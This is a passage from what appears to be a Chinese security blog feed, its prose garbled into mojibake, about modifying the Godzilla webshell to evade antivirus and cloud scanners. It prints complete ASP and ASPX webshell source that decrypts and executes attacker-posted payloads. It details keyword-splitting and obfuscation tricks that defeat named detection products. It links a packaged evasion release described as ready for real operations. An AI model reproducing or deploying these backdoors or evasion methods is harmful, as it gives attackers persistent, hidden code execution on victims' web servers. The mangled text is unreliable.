class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Set bypassDictionary = Server.CreateObject(&quot;Scripting.Dictionary&quot;)</span><br><span class="line"></span><br><span class="line">Function Base64Decode(ByVal vCode)</span><br><span class="line">    Dim oXML, oNode</span><br><span class="line">    Set oXML = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;)</span><br><span class="line">    Set oNode = oXML.CreateElement(&quot;base64&quot;)</span><br><span class="line">    oNode.dataType = &quot;bin.base64&quot;</span><br><span class="line">    oNode.text = vCode</span><br><span class="line">    Base64Decode = oNode.nodeTypedValue</span><br><span class="line">    Set oNode = Nothing</span><br><span class="line">    Set oXML = Nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function decryption(content,isBin)</span><br><span class="line">    dim size,i,result,keySize</span><br><span class="line">    keySize = len(key)</span><br><span class="line">    Set BinaryStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    BinaryStream.CharSet = &quot;iso-8859-1&quot;</span><br><span class="line">    BinaryStream.Type = 2</span><br><span class="line">    BinaryStream.Open</span><br><span class="line">    if IsArray(content) then</span><br><span class="line">        size=UBound(content)+1</span><br><span class="line">        For i=1 To size</span><br><span class="line">            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))</span><br><span class="line">        Next</span><br><span class="line">    end if</span><br><span class="line">    BinaryStream.Position = 0</span><br><span class="line">    if isBin then</span><br><span class="line">        BinaryStream.Type = 1</span><br><span class="line">        decryption=BinaryStream.Read()</span><br><span class="line">    else</span><br><span class="line">        decryption=BinaryStream.ReadText()</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line">    key=&quot;3c6e0b8a9c15224a&quot;</span><br><span class="line">    content=request.Form(&quot;pass&quot;)</span><br><span class="line">    if not IsEmpty(content) then</span><br><span class="line"></span><br><span class="line">        if  IsEmpty(Session(&quot;payload&quot;)) then</span><br><span class="line">            content=decryption(Base64Decode(content),false)</span><br><span class="line">            Session(&quot;payload&quot;)=content</span><br><span class="line">            response.End</span><br><span class="line">        else</span><br><span class="line">            content=decryption(Base64Decode(content),true)</span><br><span class="line">            bypassDictionary.Add &quot;payload&quot;,Session(&quot;payload&quot;)</span><br><span class="line">            Execute(bypassDictionary(&quot;payload&quot;))</span><br><span class="line">            result=run(content)</span><br><span class="line">            response.Write(&quot;11cd6a&quot;)</span><br><span class="line">            if not IsEmpty(result) then</span><br><span class="line">                response.Write Base64Encode(decryption(result,true))</span><br><span class="line">            end if</span><br><span class="line">            response.Write(&quot;ac826a&quot;)</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç°Execute(bypassDictionary(â€œpayloadâ€))  è¿™ä¸€å¥è‚¯å®šæ˜¯æ£€æŸ¥çš„é‡ç‚¹äº†ã€‚ç»è¿‡çœ‹æ–‡ç« ï¼Œä¸€å…±å°±ä¸‰ä¸ªæ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼Œ</p><p>Eval</p><p>Execute</p><p>ExecuteGlobal</p><p>å¤§æ¦‚ç‡æ˜¯ä¸å¥½è¿‡äº†ã€‚aspå¯ä»¥ä½¿ç”¨chrï¼ˆ97ï¼‰è¿™ç§æ–¹å¼è¿›è¡Œæ··æ·†å…³é”®å­—ã€‚ä½†æ˜¯evalè¿™ç§ä¸å¯ä»¥ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127173004460.png" alt="image-20241127173004460"></p><p>ç±»ä¼¼è¿™ç§ã€‚å­—ç¬¦ä¸²å’Œchræ‹¼æ¥ã€‚</p><p>å¤§æ¦‚è¿™æ ·</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172721137.png" alt="image-20241203172721137"></p><p>çœ‹ä¸€ä¸‹æŸ¥æ€æ•ˆæœï¼Œé¦–å…ˆçœ‹æœ€å¼ºçš„é˜¿é‡Œäº‘</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203171242474.png" alt="image-20241203171242474"></p><p>å¦‚æˆ‘ä»¬æ‰€æƒ³ï¼Œé˜¿é‡Œäº‘ç›´æ¥æ£€æµ‹EXECUTEï¼Œå­˜åœ¨å³è¢«banï¼Œé‚£è¿™æ ·çš„è¯ï¼Œæ²¡å•¥å¥½åŠæ³•äº†ï¼Œå’Œphpçš„evalä¸€æ ·äº†ã€‚å…ˆæç€ï¼Œåé¢ç¬”è€…åœ¨å­¦ä¹ å­¦ä¹ ã€‚</p><p>å¾®æ­¥æ²¡é—®é¢˜</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172311267.png" alt="image-20241203172311267"></p><p>æ²³é©¬ä¹Ÿæ²¡é—®é¢˜</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172638930.png" alt="image-20241203172638930"></p><p>dç›¾</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203173204184.png" alt="image-20241203173204184"></p><p>360 ç«ç»’</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203173743521.png" alt="image-20241203173743521"></p><p>é‚£ä¹ˆä¹Ÿå°±æ˜¯é™¤äº†aliyun  å…¶ä»–åº”è¯¥éƒ½æ²¡å•¥é—®é¢˜</p><p>æˆ‘ä»¬è¿›è¡Œç®€å•ä¼˜åŒ–ä¸€ä¸‹ï¼Œå‡½æ•°å’Œå­—ç¬¦ä¸²å¤ç”¨ä¸€ä¸‹ï¼Œå°½é‡å°‘äº›ä¸€ç‚¹å­—ç¬¦ã€‚</p><p>ç„¶åæ•´åˆ°åˆ°å“¥æ–¯æ‹‰é‡Œã€‚æ›¿æ¢ä¸€ä¸‹å˜é‡åã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091248725.png" alt="image-20241204091248725"></p><p>æ¨¡æ¿ä¹Ÿä¿®æ”¹ä¸€ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091323827.png" alt="image-20241204091323827"></p><p>ç„¶åæ‰“åŒ…è¯•ä¸€ä¸‹æ•ˆæœã€‚ç”Ÿæˆä¸‰ä¸ªå…æ€ğŸï¼Œéƒ½ä¸ä¸€æ ·ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091723915.png" alt="image-20241204091723915"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204092133180.png" alt="image-20241204092133180"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204092220267.png" alt="image-20241204092220267"></p><p>okï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚æ¥ä¸‹æ¥çœ‹aspxã€‚</p><h5 id="aspx-å…æ€"><a href="#aspx-å…æ€" class="headerlink" title="aspx å…æ€"></a>aspx å…æ€</h5><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹aspxçš„CSHAP_AES_BASE64çš„ğŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ PAge LaNgUagE=&quot;C#&quot;%&gt;</span><br><span class="line">&lt;%try &#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session[&quot;payload&quot;] == null) &#123; Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); ; &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125; &#125; catch (System.Exception) &#123; &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç ç›¸å¯¹è¾ƒçŸ­ã€‚åº”è¯¥è°ƒç”¨base64æ¯”è¾ƒç®€å•ã€‚aspè°ƒç”¨base64ä»£ç ç›¸å¯¹è¾ƒå¤šï¼Œä»£ç ä¸€åº¦åˆ°äº†60è¡Œã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨åŠ è½½base64ã€‚ä¸»è¦å°±æ˜¯å°†è¿”å›çš„ç»“æœaesåè¿›è¡Œbase64ã€‚</p><p><code>data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(changshangyi), System.Text.Encoding.Default.GetBytes(changshangyi)).TransformFinalBlock(data, 0, data.Length);</code></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204101405346.png" alt="image-20241204101405346"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204101424781.png" alt="image-20241204101424781"></p><p>è¿™ä¸€å¥åº”è¯¥æ˜¯é‡è¦ï¼Œè¿˜æœ‰</p><p><code>Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));</code></p><p>ç†è®ºä¸Šæ¥è¯´å…³äºdataå¤„ç†çš„éƒ½æ˜¯é‡è¦çš„ï¼Œdç›¾éƒ½æ ‡è®°äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204110311317.png" alt="image-20241204110311317"></p><p>è¿™ä¸ªåœ°æ–¹å®šä¹‰ä¸€ä¸ªå˜é‡ä¼ å‚ï¼Œæˆ–è€…</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204110338085.png" alt="image-20241204110338085"></p><p>ç›´æ¥å°†aesæ‹†å¼€ä¹Ÿè¡Œã€‚</p><p>ç°åœ¨æŠ¥å¯ç–‘ã€‚å†fuzzä¸€ä¸‹ï¼Œå“ªé‡Œå¯ç–‘ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204114604778.png" alt="RijndaelManaged"></p><p>RijndaelManaged æ¢æˆAesManaged<br>å¯ç–‘æ–‡ä»¶å‡ºç°åœ¨ä¸‹é¢è¿™ä¸€å¥è¯ä¸Š<br>System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod(â€œLoadâ€, parameterTypes);</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204115526559.png" alt="image-20241204115526559"></p><p>è¿™é‡Œè¿˜æ˜¯ç»™ä»–æ‹†å¼€å†™ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204115615828.png" alt="image-20241204115615828"></p><p>è¿™æ ·å°±å¯ä»¥äº†ã€‚è¿‡æ‰dç›¾ã€‚<br>ä½†æ˜¯è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œå°±æ˜¯æ˜¾ç¤ºè¯¥æ–‡ä»¶ä¸ºå•æ–‡ä»¶aspxï¼Œæœ‰ç‚¹ä¸‘é™‹ã€‚<br>ç»è¿‡fuzzç¬”è€…å‘ç°ï¼Œè¿™ä¸ªå•æ–‡ä»¶</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134046641.png" alt="image-20241204134046641"></p><p>åŒ¹é…çš„å°±æ˜¯å¼€å¤´çš„æ ‡è¯†ASPXçš„ä¸€ä¸ªå­—æ®µï¼Œå¯ä»¥æ˜¯ cã€jsã€Jscript ã€CSHARPç­‰</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134500691.png" alt="image-20241204134500691"></p><p>æ²¡æœ‰è¿™ä¸ªå°±ä¸æŠ¥äº†ã€‚<br>ç»è¿‡æœç´¢ï¼Œè¿™ä¸ªå¤§å¸ˆå‚…å·²ç»ç»™å‡ºäº†è§£å†³æ–¹æ¡ˆã€‚</p><p><a href="https://xz.aliyun.com/t/10937">https://xz.aliyun.com/t/10937</a></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134555743.png" alt="image-20241204134555743"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134705522.png" alt="image-20241204134705522"></p><p>æ”¾åˆ°æœ€åï¼Œå¹¶ä¸”è¦&lt;% @language=â€c#â€ %&gt;è¿™ä¹ˆå†™  å°±å¯ä»¥ç»•è¿‡äº†ã€‚åœ¨ä¼˜åŒ–ä¸€ä¸‹key å’Œ pass  è¿›è¡Œç¼–ç ä¸€ä¸‹ï¼Œéšè—èµ·æ¥ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204151737129.png" alt="image-20241204151737129"></p><p>æ¥çœ‹ä¸€ä¸‹aliyunï¼Œè¿˜æ˜¯æŠ¥æ¶æ„ï¼Œä½†æ˜¯è¿™æ¬¡å¹¶æ²¡æœ‰ç»™å‡ºæ£€æµ‹çš„å“ªé‡Œï¼Œemmmmï¼Œå»fuzzçš„è¯ï¼Œç›¸å¯¹æ¯”è¾ƒéš¾ï¼Œå°±æ˜¯éšä¾¿åˆ é™¤ä»£ç çš„è¯ï¼Œä¼šæŠ¥æ­£å¸¸ï¼Œå› ä¸ºé˜¿é‡Œäº‘ä¼šåŠ¨æ€æ£€æµ‹ï¼Œè¯­æ³•ä¸å¯¹ï¼Œå°±ç›´æ¥æŠ¥æ­£å¸¸äº†ã€‚fuzzçš„æ—¶é—´ç›¸å¯¹é•¿ä¸€äº›ã€‚å…ˆæç½®æŠŠã€‚<br>å¾®æ­¥</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094648151.png" alt="image-20241212094648151"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094657373.png" alt="image-20241212094657373"></p><p>360 ç«ç»’</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094812882.png" alt="image-20241212094812882"></p><p>å…æ€éƒ½æ²¡å•¥é—®é¢˜ã€‚<br>è¿™é‡Œæ²¡æœ‰ä½¿ç”¨å…¶ä»–å¤§å¸ˆå‚…é‚£ç§ unicodeç¼–ç çš„å…æ€ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œè¿˜æ˜¯åœ¨jspä¸­é‡åˆ°çš„ï¼Œåœ¨dç›¾ä¸­ï¼Œåªè¦æœ‰unicodeç¼–ç ï¼Œå°±æŠ¥å¯ç–‘ï¼Œæ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½ï¼Œæ‰€ä»¥å°±æ²¡æœ‰ä½¿ç”¨ã€‚å½“ç„¶ï¼Œaspxæ˜¯å¯ä»¥ä½¿ç”¨unicodeè¿›è¡Œå…æ€çš„ã€‚<br>å¥½å¼€å§‹å¾€é‡ŒçŒï¼Œæ•´æˆåŠ¨æ€çš„ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212163555701.png" alt="image-20241212163555701"></p><p>ç®€å•å†™ä¸€ä¸‹ï¼Œæ›¿æ¢codeå³å¯ã€‚<br>ä¸€å¦‚æ—¢å¾€ç”Ÿæˆä¸‰ä¸ªã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164351419.png" alt="image-20241212164351419"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡éƒ½ä¸ä¸€å®šã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164655181.png" alt="image-20241212164655181"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164708818.png" alt="image-20241212164708818"></p><p>okï¼Œä½¿ç”¨ä¹Ÿæ²¡é—®é¢˜ã€‚è¿™æ ·çš„è¯ï¼Œaspxçš„å…æ€ä¹Ÿå°±å®Œæˆäº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>è¿™é‡Œä¹Ÿç®—è¿›è¡Œäº†ç®€å•çš„å…æ€ï¼Œå…¨éƒ¨è¯­è¨€é™¤äº† aliyunæ²¡æœ‰è¿‡å»ï¼Œå…¶ä»–çš„å¹³å°åŸºæœ¬å…¨è¿‡ã€‚ä¸å¾—ä¸æ‰¿è®¤ï¼Œaliyunæ˜¯å¼ºçš„ã€‚php ç®€å•ä½¿ç”¨äº†ä¸€ä¸‹ç±»ã€å¯¹å…³é”®å­—è¿›è¡Œäº†chrçš„æ›¿æ¢ï¼Œjspé‡å†™äº†base64ç¼–ç æ–¹æ³•ï¼Œé‡å†™äº†åŠ è½½aesï¼Œä½¿ç”¨çš„åå°„å‹æ–¹æ³•å†™çš„ï¼Œå¯¹å…³é”®å­—è¿›è¡Œæ›¿æ¢ï¼Œaspä½¿ç”¨äº†chrè¿›è¡Œæ›¿æ¢å…³é”®å­—æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæ¢äº†ä¸€ä¸‹å‡½æ•°çš„å†™æ³•ï¼Œaspxå¯¹å…³é”®å‡½æ•°æ‹†å¼€é‡å†™ï¼Œå¹¶ä¸”å°†å…³é”®æŸ¥æ€å‡½æ•°é‡æ–°å†™äº†ä¸€ä¸‹ï¼Œå¯¹å…³é”®å­—base64ç¼–ç ã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>1.1ç‰ˆæœ¬æ·»åŠ æœ¨é©¬çš„å…æ€ï¼Œå…¨è¯­è¨€éƒ½åšå¥½äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ï¼Œ<br>åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è¿˜æœ‰å°±æ˜¯messageå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚è¿˜æœ‰ä¼ é€’çš„å‚æ•° page=1&amp;size=10 æ˜¯å›ºå®šçš„ï¼Œè®©ä»–ä¹ŸåŠ¨èµ·æ¥ã€‚å…¶ä»–è¯­è¨€çš„ æ¯”å¦‚  jspfçš„ ï¼Œasmxçš„éƒ½æ²¡åšï¼Œåé¢åšã€‚</p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a><br>release 1.1 å…æ€ç‰ˆæœ¬ï¼Œsrcä»£ç ä¹Ÿä»¥ä¸Šä¼ ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½ç ”ç©¶å³å¯ã€‚<br>ä¸Šä¸ªç‰ˆæœ¬ç”±äºå†™çš„æ¯”è¾ƒèœï¼Œæ²¡å¥½æ„æ€è·Ÿå¤§å®¶è¦starï¼Œè¿™æ¬¡è‡ªæˆ‘æ„Ÿè§‰è¿˜è¡Œï¼Œä¹Ÿç®—æ˜¯å®æˆ˜èƒ½ç”¨äº†ï¼Œå¦‚æœæ„Ÿè§‰è¿˜å‡‘åˆï¼Œå¤§å®¶å¸®å¿™ç‚¹ç‚¹star</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™æˆ–è€…å·¥å…·ç”¨èµ·æ¥è¿˜è¡Œï¼Œå¸®ç¬”è€…ç‚¹ç‚¹starsã€ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            åŸç‰ˆå“¥æ–¯æ‹‰</span><br><span class="line">https://github.com/Tas9er/ByPassGodzilla   ByPassGodzilla</span><br><span class="line">https://xz.aliyun.com/t/2758               åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹.NETç¯‡</span><br><span class="line">https://xz.aliyun.com/t/10937              æµ‹è¯•å‡ ç§å®æˆ˜æˆåŠŸè¿‡çš„webshellçš„å…æ€æ–¹å¼</span><br><span class="line">https://xz.aliyun.com/t/11368              å®æˆ˜åˆ†ææŸçº¢é˜Ÿé­”æ”¹å“¥æ–¯æ‹‰Webshell</span><br><span class="line">https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/                   webshellå…æ€ç ”ç©¶jspç¯‡</span><br><span class="line">https://www.secpulse.com/archives/193780.html        ç®€å•æ“ä½œå®ç°å†°èjsp webshell é˜¿é‡Œäº‘å…æ€ </span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> äºŒå¼€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1</title>
      <link href="/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/"/>
      <url>/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å­¦ä¹ äº†ä¸€ä¸‹å†°èå’Œå“¥æ–¯æ‹‰çš„äºŒå¼€ï¼Œä½†ä¹Ÿåªæ˜¯å­¦ä¹ äº†ä¸€ä¸¢ä¸¢çš®æ¯›ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="image-20241114102655833"></p><h5 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h5><p>php5.2  php7.4 java 1.8</p><p>å‡†å¤‡å·¥ä½œï¼Œè¿™é‡Œè¿˜æ˜¯å»ºè®®ä½¿ç”¨ideaï¼Œæˆ‘ç”¨vscode  è°ƒï¼Œç¬¬ä¸€æ­¥é…ç¯å¢ƒå°±ç»™æˆ‘å¡æ­»äº†ï¼Œè°ƒäº†å¾ˆä¹…éƒ½æ²¡æœ‰è°ƒæ˜ç™½ï¼Œå¤ªèœäº†ã€‚</p><p>é¦–å…ˆè‡´æ•¬ä¸€ä¸‹åŸç‰ˆå“¥æ–¯æ‹‰ï¼ŒåŸç‰ˆåœ°å€<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æœ€æ–°çš„<a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">v4.0.1-godzilla</a>ç‰ˆæœ¬ï¼Œè¿›è¡Œé€†å‘åŠäºŒå¼€ã€‚</p><p>åç¼–è¯‘ç½‘å€ï¼Œ<a 